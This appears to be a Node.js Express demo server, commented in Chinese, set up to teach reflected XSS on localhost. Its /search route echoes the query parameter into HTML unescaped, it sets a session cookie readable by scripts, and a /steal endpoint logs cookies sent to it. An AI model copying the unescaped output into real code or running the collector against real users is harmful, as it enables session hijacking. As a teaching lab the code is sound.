const express = require('express');
const https = require('https');
const fs = require('fs');
const app = express();
const port = 3000;

app.use(express.urlencoded({ extended: true }));

// 加载自签名证书（请根据自己的路径替换）
const options = {
  key: fs.readFileSync('private-key.pem'),  // 替换为你自签名证书的私钥路径
  cert: fs.readFileSync('certificate.pem') // 替换为你自签名证书的证书路径
};

// 设置 Cookie，包含 SameSite=None 和 Secure 属性
app.use((req, res, next) => {
  res.setHeader('Set-Cookie', 'session=abc123; Path=/; SameSite=None; Secure');
  next();
});

// 反射型 XSS 漏洞页面
app.get('/search', (req, res) => {
  const keyword = req.query.keyword || '';

  // ❗️直接将用户输入插入 HTML，没有任何过滤或转义
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><title>搜索页面</title></head>
    <body>
      <h1>你搜索的是：${keyword}</h1>
      <form method="GET" action="/search">
        <input name="keyword" placeholder="搜索关键词">
        <button type="submit">搜索</button>
      </form>
    </body>
    </html>
  `);
});

// 接收偷过来的 Cookie
app.get('/steal', (req, res) => {
  console.log('💀 偷到的 Cookie:', req.query.cookie);
  res.send('Cookie logged!');
});

// 启动 HTTPS 服务器
https.createServer(options, app).listen(port, () => {
  console.log(`反射型 XSS 演示服务已启动：https://localhost:${port}`);
});
